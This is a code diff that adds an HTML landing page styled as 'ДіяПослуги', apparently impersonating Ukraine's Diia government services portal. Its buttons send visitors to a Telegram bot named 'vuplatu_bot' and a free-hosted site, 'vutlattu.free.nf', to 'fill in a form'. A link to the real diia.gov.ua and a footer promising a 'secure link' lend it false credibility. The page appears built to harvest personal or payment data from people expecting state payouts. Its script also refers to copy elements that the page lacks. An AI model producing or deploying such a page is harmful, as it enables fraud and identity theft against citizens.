@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Послуги</title>
+
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root{
+  --panel-bg: rgba(0,0,0,0.6);
+  --text: #fff;
+  --muted: rgba(255,255,255,0.7);
+  --btn-primary-bg: #fff;
+  --btn-primary-hover: #f0f0f0;
+  --btn-ghost-bg: transparent;
+  --btn-ghost-border: 1px solid rgba(255,255,255,0.5);
+  --radius: 12px;
+  --max-width:780px;
+}
+
+html, body{height:100%; margin:0; font-family:"Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;}
+body{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:28px;
+  background: linear-gradient(270deg, #5b2cff, #2b4dff, #00d3c1, #00ff8a);
+  background-size: 800% 800%;
+  animation: gradientAnimation 20s ease infinite;
+  color: var(--text);
+  overflow-x:hidden;
+}
+
+@keyframes gradientAnimation {
+  0%{background-position:0% 50%;}
+  50%{background-position:100% 50%;}
+  100%{background-position:0% 50%;}
+}
+
+.card{
+  width:100%;
+  max-width:var(--max-width);
+  display:flex;
+  flex-direction:column;
+  gap:24px;
+  align-items:center;
+  justify-content:center;
+  padding:36px;
+  border-radius:18px;
+  box-shadow: 0 6px 30px rgba(0,0,0,0.2);
+  background: var(--panel-bg);
+  backdrop-filter: blur(16px);
+  text-align:center;
+  opacity:0;
+  transform: translateY(20px);
+  animation: fadeInCard 1s forwards;
+}
+
+@keyframes fadeInCard {
+  to { opacity:1; transform:translateY(0);}
+}
+
+h1{
+  font-size:28px;
+  line-height:1.05;
+  font-weight:700;
+  margin-bottom:12px;
+  opacity:0;
+  transform:translateY(20px);
+  animation: fadeInText 0.8s forwards 0.3s;
+}
+
+.highlight{
+  display:inline-block;
+  padding:4px 10px;
+  border-radius:6px;
+  background: rgba(255,255,255,0.9);
+  color:#000;
+  font-weight:700;
+  font-size:28px;
+  position:relative;
+  transition: all 0.3s ease;
+  animation: glowPulse 2s ease-in-out infinite;
+}
+
+.highlight::after{
+  content:'';
+  position:absolute;
+  top:0; left:0; right:0; bottom:0;
+  border-radius:6px;
+  box-shadow: 0 0 0 rgba(255,255,255,0);
+  transition: box-shadow 0.3s ease;
+}
+
+.highlight:hover::after{
+  box-shadow: 0 0 10px 2px rgba(255,255,255,0.6);
+}
+
+@keyframes glowPulse {
+  0%, 100% { box-shadow: 0 0 0px rgba(255,255,255,0.3); }
+  50% { box-shadow: 0 0 12px rgba(255,255,255,0.5); }
+}
+
+p.lead{
+  color:var(--muted);
+  font-size:15px;
+  max-width:56ch;
+  margin-bottom:18px;
+  opacity:0;
+  transform:translateY(20px);
+  animation: fadeInText 0.8s forwards 0.5s;
+}
+
+@keyframes fadeInText {
+  to { opacity:1; transform:translateY(0);}
+}
+
+.btn{
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  text-decoration:none;
+  padding:12px 20px;
+  border-radius:12px;
+  font-weight:700;
+  cursor:pointer;
+  transition:transform .12s ease, background .12s ease, box-shadow .2s ease;
+  margin-bottom:8px;
+  opacity:0;
+  transform:translateY(20px);
+}
+
+.btn-primary{
+  background: var(--btn-primary-bg);
+  color:#000;
+}
+.btn-primary:hover{
+  transform:translateY(-2px);
+  background: var(--btn-primary-hover);
+  box-shadow: 0 8px 25px rgba(255,255,255,0.5), 0 0 12px rgba(255,255,255,0.2) inset;
+}
+
+.btn-ghost{
+  background: var(--btn-ghost-bg);
+  border: var(--btn-ghost-border);
+  color:#fff;
+  font-weight:600;
+}
+.btn-ghost:hover{
+  transform:translateY(-2px);
+  box-shadow: 0 6px 15px rgba(255,255,255,0.3), 0 0 10px rgba(255,255,255,0.1) inset;
+}
+
+@keyframes fadeInBtn {
+  to { opacity:1; transform:translateY(0);}
+}
+
+.input-copy{
+  padding:8px;
+  border-radius:8px;
+  border:1px solid #eee;
+  font-size:13px;
+  width:180px;
+}
+
+.foot{
+  margin-top:18px;
+  font-size:13px;
+  color:var(--muted);
+  text-align:center;
+}
+
+@media (max-width:780px){
+  .card{padding:24px;}
+  h1{font-size:22px;}
+  .highlight{font-size:22px; padding:3px 8px;}
+}
+</style>
+</head>
+<body>
+<main class="card" role="main" aria-labelledby="title">
+  <h1 id="title">Вітаємо у <span class="highlight">ДіяПослугах</span></h1>
+
+  <p class="lead" id="desc">
+    Швидкий та надійний перехід до наших онлайн-послуг. Виберіть один з доступних варіантів отримання допомоги 
+  </p>
+
+  <a id="openBtn" class="btn btn-primary" target="_blank" rel="noopener noreferrer" href="#">
+    Заповнити анкету в Telegram
+  </a>
+
+  <a id="websiteBtn" class="btn btn-ghost" target="_blank" rel="noopener noreferrer" href="#">
+    Заповнити анкету на сайті
+  </a>
+
+  <a id="infoBtn" class="btn btn-ghost" target="_blank" rel="noopener noreferrer" href="#">
+    Більше інформації
+  </a>
+
+
+  <div class="foot">
+    Працює на безпечному посиланні. 
+  </div>
+</main>
+
+<script>
+(function(){
+  const config = {
+    botLink: "https://t.me/vuplatu_bot",
+    websiteLink: "https://vutlattu.free.nf/",
+    infoLink: "https://diia.gov.ua",
+  };
+
+  const openBtn = document.getElementById("openBtn");
+  const websiteBtn = document.getElementById("websiteBtn");
+  const infoBtn = document.getElementById("infoBtn");
+  const copyInput = document.getElementById("copyInput");
+  const copyBtn = document.getElementById("copyBtn");
+
+  if(config.botLink && config.botLink!=="#") openBtn.href=config.botLink; else openBtn.style.display="none";
+  if(config.websiteLink && config.websiteLink!=="#") websiteBtn.href=config.websiteLink; else websiteBtn.style.display="none";
+  if(config.infoLink && config.infoLink!=="#") infoBtn.href=config.infoLink; else infoBtn.style.display="none";
+
+  const buttons = [openBtn, websiteBtn, infoBtn, copyBtn];
+  buttons.forEach((btn,i)=>{
+    btn.style.animation = `fadeInBtn 0.6s forwards ${(i+1)*0.3}s`;
+  });
+
+  copyBtn.addEventListener("click", async function(){
+    if(!copyInput.value) return;
+    try{
+      await navigator.clipboard.writeText(copyInput.value);
+      copyBtn.textContent="Скопійовано!";
+      setTimeout(()=>copyBtn.textContent="Копіювати",1400);
+    } catch(e){
+      copyInput.select();
+      document.execCommand('copy');
+      copyBtn.textContent="Скопійовано!";
+      setTimeout(()=>copyBtn.textContent="Копіювати",1400);
+    }
+  });
+})();
+</script>
+</body>
+</html>
